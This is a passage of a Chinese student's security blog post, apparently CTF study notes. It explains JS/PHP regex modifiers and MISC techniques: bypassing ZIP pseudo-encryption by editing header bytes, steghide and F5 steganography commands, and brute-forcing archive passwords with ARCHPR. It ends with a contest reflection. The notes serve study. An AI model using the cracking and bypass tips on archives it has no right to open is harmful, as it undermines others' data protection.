+<p>例如: /abc/i 可以匹配 abc、aBC、Abc </p>
+<p>g 全局(global)匹配 </p>
+<p>如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回</p>
+<p>如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置</p>
+<p>例如: </p>
+<p>var str = ‘aaaaaaaa’</p>
+<p>var reg1 = /a/;  str.match(reg1)  // 结果为：[“a”, index: 0, input: “aaaaaaaa”]</p>
+<p>var reg2 = /a/g; str.match(reg2)  // 结果为：[“a”, “a”, “a”, “a”, “a”, “a”, “a”, “a”]</p>
+<p>m 多(more)行匹配</p>
+<p>若存在换行\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配,</p>
+<p>因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行，</p>
+<p>g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始</p>
+<p>var str = “abcggab\nabcoab”;</p>
+<p>var preg1 = /^abc/gm;  str.match(preg1)  // 结果为：[“abc”, “abc”]</p>
+<p>var preg2 = /ab$/gm;   str.match(preg2)  // 结果为：[“ab”, “ab”]</p>
+<p>s 特殊字符圆点 . 中包含换行符</p>
+<p>默认的圆点 . 是 匹配除换行符 \n 之外的任何单字符，加上s之后, . 中包含换行符</p>
+<p>$str = “abggab\nacbs”;</p>
+<p>$preg = “/b./s”;</p>
+<p>preg_match_all($preg, $str,$matchs);</p>
+<p>print_r($matchs);//Array ( [0] =&gt; Array ( [0] =&gt; bg [1] =&gt; b [2] =&gt; bs ) ) </p>
+<p>U 只匹配最近的一个字符串;不重复匹配; </p>
+<p>$mode=”/a(.*?)c/“;</p>
+<p>$preg=”/a.*c/U”;//这两个正则返回相同的值</p>
+<p>$str=”abcabbbcabbbbbc” ;</p>
+<p>preg_match($mode,$str,$content);   echo $content[0];//abc</p>
+<p>preg_match($preg,$str,$content);   echo $content[0];//abc</p>
+<p>//修正符:x 将模式中的空白忽略; </p>
+<p>//修正符:A 强制从目标字符串开头匹配;</p>
+<p>//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; </p>
+<p>//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </p>
+<h4 id="4-1-1参考链接"><a href="#4-1-1参考链接" class="headerlink" title="4.1.1参考链接"></a>4.1.1参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html">https://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html</a></p>
+<h3 id="5-1MISC"><a href="#5-1MISC" class="headerlink" title="5.1MISC"></a>5.1MISC</h3><h4 id="5-1-1伪加密"><a href="#5-1-1伪加密" class="headerlink" title="5.1.1伪加密"></a>5.1.1伪加密</h4><p>用010hex打开zip文件。</p>
+<p>把504B0304后的第3、4个byte改成0000还有</p>
+<p>把504B0102后的第5、6个byte改成0000即可破解伪加密。</p>
+<p>##识别真假加密</p>
+<p>无加密</p>
+<p>压缩源文件数据区的全局加密应当为00 00</p>
+<p>且压缩源文件目录区的全局方式位标记应当为00 00</p>
+<p>假加密</p>
+<p>压缩源文件数据区的全局加密应当为00 00</p>
+<p>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p>真加密</p>
+<p>压缩源文件数据区的全局加密应当为09 00</p>
+<p>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<h4 id="5-1-2工具stefhide"><a href="#5-1-2工具stefhide" class="headerlink" title="5.1.2工具stefhide"></a>5.1.2工具stefhide</h4><p>Steghide是一个可以将文件隐藏到图片或音频中的工具</p>
+<p>隐藏文件</p>
+<p>steghide embed -cf [图片文件载体] -ef [待隐藏文件]</p>
+<p>steghide embed -cf 1.jpg -ef 1.txt</p>
+<p>查看图片中嵌入的文件信息</p>
+<p>steghide info 1.jpg</p>
+<p>提取图片中隐藏的文件</p>
+<p>steghide extract -sf 1.jpg</p>
+<p>使用steghide发现图片有隐写文件，使用steghide extract -sf good.jpg，空密码即可</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aluxian_/article/details/121968033">https://blog.csdn.net/Aluxian_/article/details/121968033</a></p>
+<h4 id="5-1-3工具F5-steganography"><a href="#5-1-3工具F5-steganography" class="headerlink" title="5.1.3工具F5-steganography"></a>5.1.3工具F5-steganography</h4><p>f5隐写，利用工具：F5-steganography: <a target="_blank" rel="noopener" href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p>
+<p>命令：java Extract C:\Users\alun\OneDrive\桌面\Misc.jpg</p>
+<p>会在f5隐写工具的目录下生成文件夹</p>
+<h2 id="二、学习总结"><a href="#二、学习总结" class="headerlink" title="二、学习总结"></a>二、学习总结</h2><p>2022年11月12日八点半到十一点，打了安工第一届信安大赛，有些感悟。</p>
+<p>这次比赛属于新生赛，赛题都比较简单，可惜我没有写出几题，结果有些不尽人意。</p>
+<p>说一下为什么。</p>
+<p>缺乏做题经验，web题目四道写出两道，re写两道，pwn写一道，misc写一道，好像没了，写出来的这几题都很简单，动动手就出了，没写出来的也没觉得很难，很多都是出了一般，没思路了。对于Crypto这一类更是一题都不会做，主要不会写脚本……</p>
+<p>这两天写了一些MISC题目，总结了以下几点思路</p>
+<p>1.对于图片隐写这类题型，先看属性，说不定有惊喜。属性中可能带有描述，以及分辨率，对于分辨率我们可以判断图片是否缺少，若缺少就用winhex修改图片的宽高。有些flag直接用winhex查找字符串就能得到。</p>
+<p>2.第二步用winhex打开查看文件头，每个类型的文件都有不同类型的文件头，说不准某些png，jpg文件中会有zip头部，这样直接修改后缀为zip解压或是扔到kali用binwalk分离。</p>
+<p>3.有些压缩包中的文件解压需要密码，这时就要看是否为伪加密，判断加密类型之后题目大概就能做出来了。</p>
+<p>4.有些题目中给了压缩密码的提示，比如四位纯数字，这时我们就可以直接用ziperllo（破解rar文件）与ARCHPR(破解zip文件)爆破密码。</p>
+<p>5.对于LSB类的题目，首先扔进Stegsolve中对其RGB调整为0，查看hex，根据hex保存其文件类型，比如PK头就是zip文件类型等等。</p>
+<p>6.对于二次解压题目，需要将隐藏文件用foremost分离。</p>
+<p>7.流量分析题目就查看流量包，然后追踪http或者tcp流（还需做题加深一下）</p>
+<p>8.二维码之类的题目，若完整就用CQR识别,不完整就想办法补充完整。</p>
+<p>差不多就这些，以后再做补充。</p>
+<h2 id="三、下周计划"><a href="#三、下周计划" class="headerlink" title="三、下周计划"></a>三、下周计划</h2><p>下周主攻MISC，学一下python脚本编写。副攻web中的命令执行和php特性这类题目。</p>
+<p>加油(ง •_•)ง</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div class="post-widgets">
+    <div
+      class="social-share"
+      
+        data-sites="weibo,qq,wechat,tencent,douban,qzone,linkedin,diandian,facebook,twitter,google"
+      
+      
+        data-wechat-qrcode-title="share.title"
+      
+      
+        data-wechat-qrcode-helper="share.prompt"
+      
+    >
+    </div>
+  </div>
+  <script src="https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js"></script>
+          <div class="post-tags">
+              <a href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag"># web基础</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/30/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AD/" rel="prev" title="网安基础总结六">
+                  <i class="fa fa-chevron-left"></i> 网安基础总结六
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/" rel="next" title="网安基础总结八">
+                  网安基础总结八 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">alun</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">103k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:52</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
